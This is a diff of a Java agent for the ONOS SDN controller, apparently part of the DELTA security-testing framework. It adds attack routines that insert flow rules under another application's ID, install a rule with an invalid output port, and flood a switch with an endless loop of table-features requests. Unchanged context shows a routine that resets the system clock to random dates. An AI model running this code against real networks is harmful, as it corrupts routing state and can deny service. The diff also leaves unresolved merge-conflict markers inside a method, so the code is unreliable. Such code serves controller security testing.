@@ -1,12 +1,7 @@
 package org.deltaproject.onosagent;
 
 import com.google.common.collect.Lists;
-import org.apache.felix.scr.annotations.Activate;
-import org.apache.felix.scr.annotations.Component;
-import org.apache.felix.scr.annotations.Deactivate;
-import org.apache.felix.scr.annotations.Property;
-import org.apache.felix.scr.annotations.Reference;
-import org.apache.felix.scr.annotations.ReferenceCardinality;
+import org.apache.felix.scr.annotations.*;
 import org.onlab.metrics.MetricsService;
 import org.onlab.packet.Ethernet;
 import org.onlab.packet.Ip4Prefix;
@@ -29,23 +24,18 @@ import org.onosproject.net.flow.criteria.Criterion;
 import org.onosproject.net.flow.criteria.EthCriterion;
 import org.onosproject.net.flow.criteria.PortCriterion;
 import org.onosproject.net.flow.instructions.Instruction;
-import org.onosproject.net.flow.instructions.Instructions;
+import org.onosproject.net.flow.instructions.Instructions.OutputInstruction;
 import org.onosproject.net.flowobjective.FlowObjectiveService;
 import org.onosproject.net.host.HostAdminService;
 import org.onosproject.net.host.HostService;
 import org.onosproject.net.link.LinkAdminService;
 import org.onosproject.net.link.LinkService;
-import org.onosproject.net.packet.InboundPacket;
-import org.onosproject.net.packet.PacketContext;
-import org.onosproject.net.packet.PacketPriority;
-import org.onosproject.net.packet.PacketProcessor;
-import org.onosproject.net.packet.PacketService;
+import org.onosproject.net.packet.*;
 import org.onosproject.net.statistic.FlowStatisticStore;
 import org.onosproject.net.topology.TopologyService;
 import org.onosproject.openflow.controller.Dpid;
 import org.onosproject.openflow.controller.OpenFlowController;
 import org.onosproject.openflow.controller.OpenFlowEventListener;
-import org.onosproject.openflow.controller.OpenFlowMessageListener;
 import org.osgi.framework.Bundle;
 import org.osgi.framework.BundleContext;
 import org.osgi.framework.BundleException;
@@ -53,17 +43,15 @@ import org.osgi.framework.ServiceReference;
 import org.osgi.service.component.ComponentContext;
 import org.osgi.service.component.ComponentInstance;
 import org.projectfloodlight.openflow.protocol.*;
-import org.projectfloodlight.openflow.types.U64;
-import org.slf4j.Logger;
-import org.onosproject.net.flow.instructions.Instructions.OutputInstruction;
 import org.projectfloodlight.openflow.protocol.action.OFAction;
 import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
-import javax.xml.bind.Element;
+import org.projectfloodlight.openflow.protocol.instruction.OFInstruction;
+import org.slf4j.Logger;
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.*;
-import java.util.stream.Collectors;
 
 import static org.slf4j.LoggerFactory.getLogger;
 
@@ -131,6 +119,9 @@ public class AppAgent {
     protected ClusterAdminService clusteradmin;
 
     @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
+    protected FlowStatisticStore statsStore;
+
+    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
     protected MastershipAdminService msadmin;
 
     @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
@@ -177,7 +168,7 @@ public class AppAgent {
 
         cm = new AMInterface(this);
         cm.start();
-	controller.addEventListener(listener);
+        controller.addEventListener(listener);
     }
 
     @Deactivate
@@ -216,6 +207,91 @@ public class AppAgent {
                 "packetOutOnly", "true");
     }
 
+
+    private boolean isAttackStart = false;
+    private String consistencyTestRes = "fail";
+
+    private FlowRule existFlowRule; // Rule named with 'org.onosproject.fwd'
+
+    // 3.1.00* testInconsistency
+    public String testInconsistency(char type) {
+        System.out.println("[ATTACK] Inconsistency attack");
+
+        Iterable<Device> dvs = null;
+        do {
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            dvs = deviceService.getDevices();
+
+        } while (!dvs.iterator().hasNext());
+
+        Device d = dvs.iterator().next();
+
+        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
+        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
+
+        switch (type) {
+            case '1':
+                treat.setOutput(PortNumber.portNumber(2));
+
+                selector.matchInPort(PortNumber.portNumber(1));
+                selector.matchEthType((short) 0x0800);
+
+                ApplicationId fwdId = coreService.getAppId("org.onosproject.fwd");
+                existFlowRule = new DefaultFlowRule(d.id(),
+                        selector.build(), treat.build(), 555,       // priority: 555
+                        fwdId, flowTimeout, true, null);
+                System.out.println("[ATTACK] Flow Rule inserted with name of Reactive forwarding, appId = " + fwdId);
+                System.out.println("* " + existFlowRule.toString());
+                flowRuleService.applyFlowRules(existFlowRule);
+
+                try {
+                    Thread.sleep(500);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                FlowRule newFlowRule; // Rule named with 'org.deltaproject.onosagent'
+                newFlowRule = new DefaultFlowRule(d.id(),
+                        selector.build(), treat.build(), 555,       // priority: 555
+                        appId, flowTimeout, true, null);
+
+                System.out.println("[ATTACK] Flow Rule inserted with name of Delta, appId = " + appId);
+                System.out.println("* " + newFlowRule.toString());
+                flowRuleService.applyFlowRules(newFlowRule);
+
+                //TODO: Show flow rule stored in storage here
+                //System.out.println("[Storage] Flow Rule from storage, appId = " + appId);
+                //System.out.println("** " + storageFlowRule.toString());
+                isAttackStart = true;
+
+
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+
+
+                return consistencyTestRes;
+            case '2':
+                long outputPortNum = 65536;
+                treat.setOutput(PortNumber.portNumber(outputPortNum));
+
+                selector.matchInPort(PortNumber.portNumber(1));
+                selector.matchEthType((short) 0x0800);
+
+                existFlowRule = new DefaultFlowRule(d.id(),
+                        selector.build(), treat.build(), 555,       // priority: 555
+                        appId, flowTimeout, true, null);
+                System.out.println("[ATTACK] Flow Rule inserted with output port of " + outputPortNum);
+                flowRuleService.applyFlowRules(existFlowRule);
+                return consistencyTestRes;
+        }
+        return consistencyTestRes;
+    }
 
     // 2.1.060
     public String sendUnFlaggedFlowRemoveMsg(String cmd, long ruleId) {
@@ -622,18 +698,20 @@ public class AppAgent {
         return result;
     }
 
+    // 3.1.240
     public String testInfiniteFlowRuleSynchronization() {
-	System.out.println("[ATTACK] Infinite Flow Rule Synchronization");
-	isInconsistency = "nothing";
-	checkInconsistencyFlag = 2;
+        System.out.println("[ATTACK] Infinite Flow Rule Synchronization");
+        isInconsistency = "nothing";
+        checkInconsistencyFlag = 2;
 
-	Iterable<Device> iterableDevice = deviceService.getDevices();
+        Iterable<Device> iterableDevice = deviceService.getDevices();
         Iterator iteratorDevice = iterableDevice.iterator();
 
-	System.out.println("\n====================");
+        System.out.println("\n====================");
         while (iteratorDevice.hasNext()) {
-	    int flowRuleCount = 0;
+            int flowRuleCount = 0;
             Device device = (Device) iteratorDevice.next();
+<<<<<<< HEAD
 	    System.out.println("[Controller] " + device.id() + " FlowTable");
 	    Iterable<FlowEntry> iterableFlow = flowRuleService.getFlowEntries(device.id());
 	    Iterator iteratorFlow = iterableFlow.iterator();
@@ -656,17 +734,61 @@ public class AppAgent {
 	    }
 
 	    System.out.println("---------------");
+=======
+            System.out.println("[Controller] " + device.id() + " FlowTable");
+            Iterable<FlowEntry> iterableFlow = flowRuleService.getFlowEntries(device.id());
+            Iterator iteratorFlow = iterableFlow.iterator();
+
+            while (iteratorFlow.hasNext()) {
+                FlowEntry flowEntry = (FlowEntry) iteratorFlow.next();
+                if (!flowEntry.toString().contains("CONTROLLER")) {
+                    flowRuleCount++;
+                    System.out.println("<FlowRule> " + flowEntry);
+                }
+            }
+            System.out.println("---------------");
+>>>>>>> delta-mvn
             System.out.println("[Result] " + device.id() + " FlowRuleCount: " + flowRuleCount);
             System.out.println("====================\n");
-	}
+        }
 
-	try {
-	    Thread.sleep(10000);
-	} catch (InterruptedException e) {
-	    e.printStackTrace();
-	}
+        try {
+            Thread.sleep(10000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
 
-	return isInconsistency;
+        return isInconsistency;
+    }
+
+    // 3.1.250
+    public String testTableFeaturesReplyAmplification() throws Exception {
+        System.out.println("[ATTACK] Table Features Request Amplification Attack");
+        log.info("[ATTACK] Table Features Request Amplification Attack");
+        Device device = deviceService.getAvailableDevices().iterator().next();
+        log.info("Target Device: " + device.id().toString());
+        OFFactory factory = OFFactories.getFactory(OFVersion.OF_13);
+
+//        List<OFInstruction> insts = Lists.newLinkedList();
+//        insts.add()
+//
+//        factory.buildFlowAdd()
+//                .setMatch(factory.matchWildcardAll())
+//                .setInstructions()
+
+        OFTableFeaturesStatsRequest request = factory.buildTableFeaturesStatsRequest()
+                .setXid(777)
+                .build();
+//        OFFactory factory = OFFactories.getFactory(OFVersion.OF_13);
+//        OFCalientFlowStatsRequest request = factory.buildCalientFlowStatsRequest()
+//                .setMatch(factory.matchWildcardAll())
+//                .setXid(777)
+//                .build();
+
+        while(true) {
+            controller.write(Dpid.dpid(device.id().uri()), request);
+            Thread.sleep(50);
+        }
     }
 
     /**
@@ -745,7 +867,7 @@ public class AppAgent {
                 dateInfo[1] = month[rand.nextInt(11)];
                 dateInfo[2] = String.valueOf(year);
                 try {
-                    Process proc = rt.exec(new String[] {"date", "-s", dateInfo[0] + " " + dateInfo[1] + " "
+                    Process proc = rt.exec(new String[]{"date", "-s", dateInfo[0] + " " + dateInfo[1] + " "
                             + dateInfo[2]});
                     BufferedReader br = new BufferedReader(new InputStreamReader(
                             proc.getInputStream()));
@@ -768,78 +890,83 @@ public class AppAgent {
 
         @Override
         public void handleMessage(Dpid dpid, OFMessage ofMessage) {
-	    if (ofMessage.getType() != OFType.STATS_REPLY) {
-		return;
-	    } else {
-		if (((OFStatsReply) ofMessage).getStatsType() != OFStatsType.FLOW) {
-		    return;
-		}
-	    }
+
+            if (ofMessage.getType() != OFType.STATS_REPLY) {
+                return;
+            } else {
+                if (((OFStatsReply) ofMessage).getStatsType() != OFStatsType.FLOW) {
+                    return;
+                }
+            }
 
             if (checkInconsistencyFlag < 1) {
-		return;
-	    } else {
-		checkInconsistencyFlag--;
-	    }
+                return;
+            } else {
+                checkInconsistencyFlag--;
+            }
 
-	    System.out.println("\n====================");
-	    int flowRuleCount = 0;
+            System.out.println("\n====================");
+            int flowRuleCount = 0;
             DeviceId deviceId = DeviceId.deviceId(Dpid.uri(dpid));
-	    System.out.println("[Switch] " + deviceId + " FlowTable");
+            System.out.println("[Switch] " + deviceId + " FlowTable");
             OFFlowStatsReply msg = (OFFlowStatsReply) ofMessage;
             List<OFFlowStatsEntry> entryList = msg.getEntries();
-            for(OFFlowStatsEntry e : entryList) {
-                flowRuleCount++;
-                System.out.println("<FlowRule> " + e.toString());
+
+            for (OFFlowStatsEntry e : entryList) {
+                if (!e.toString().contains("controller")) {
+                    flowRuleCount++;
+                    System.out.println("<FlowRule> " + e.toString());
+                }
             }
-	    System.out.println("---------------");
+
+            System.out.println("---------------");
             System.out.println("[Result] " + deviceId + " FlowRuleCount: " + flowRuleCount);
             System.out.println("====================\n");
 
-	    Iterable<Device> iterableDevice = deviceService.getDevices();
+            Iterable<Device> iterableDevice = deviceService.getDevices();
             Iterator iteratorDevice = iterableDevice.iterator();
 
             while (iteratorDevice.hasNext()) {
                 Device device = (Device) iteratorDevice.next();
-		if (!device.id().toString().equals(deviceId.toString())) {
-		    continue;
-		}
-	        Iterable<FlowEntry> iterableFlow = flowRuleService.getFlowEntries(device.id());
-	        Iterator iteratorFlow = iterableFlow.iterator();
+                if (!device.id().toString().equals(deviceId.toString())) {
+                    continue;
+                }
+                Iterable<FlowEntry> iterableFlow = flowRuleService.getFlowEntries(device.id());
+                Iterator iteratorFlow = iterableFlow.iterator();
 
-	        while (iteratorFlow.hasNext()) {
-		    boolean found = false;
-	            FlowEntry flowEntry = (FlowEntry) iteratorFlow.next();
-	            if (flowEntry.toString().contains("CONTROLLER")) {
-			continue;
-		    }
-		    for(OFFlowStatsEntry e : entryList) {
-			if (e.toString().contains("controller")) {
-			    continue;
-	                }
-			if (flowEntry.id().value() != e.getCookie().getValue()) {
-			    continue;
-			}
+                while (iteratorFlow.hasNext()) {
+                    boolean found = false;
+                    FlowEntry flowEntry = (FlowEntry) iteratorFlow.next();
+                    if (flowEntry.toString().contains("CONTROLLER")) {
+                        continue;
+                    }
+                    for (OFFlowStatsEntry e : entryList) {
+                        if (e.toString().contains("controller")) {
+                            continue;
+                        }
+                        if (flowEntry.id().value() != e.getCookie().getValue()) {
+                            continue;
+                        }
 
-			Instruction tempF = (OutputInstruction) flowEntry.treatment().immediate().get(0);
-			OFAction tempE = (OFActionOutput) e.getActions().get(0);
+                        Instruction tempF = (OutputInstruction) flowEntry.treatment().immediate().get(0);
+                        OFAction tempE = (OFActionOutput) e.getActions().get(0);
 
-			long tempFOutput = ((OutputInstruction) tempF).port().toLong();
-			long tempEOutput = ((OFActionOutput) tempE).getPort().getPortNumber();
+                        long tempFOutput = ((OutputInstruction) tempF).port().toLong();
+                        long tempEOutput = ((OFActionOutput) tempE).getPort().getPortNumber();
 
-			if (tempFOutput != tempEOutput) {
-			    break;
-			}
+                        if (tempFOutput != tempEOutput) {
+                            break;
+                        }
 
-			found = true;
-			break;
-	            }
+                        found = true;
+                        break;
+                    }
 
-		    if (!found) {
-			isInconsistency = flowEntry.toString();
-			break;
-		    }
-		}
+                    if (!found) {
+                        isInconsistency = flowEntry.toString();
+                        break;
+                    }
+                }
             }
         }
     }
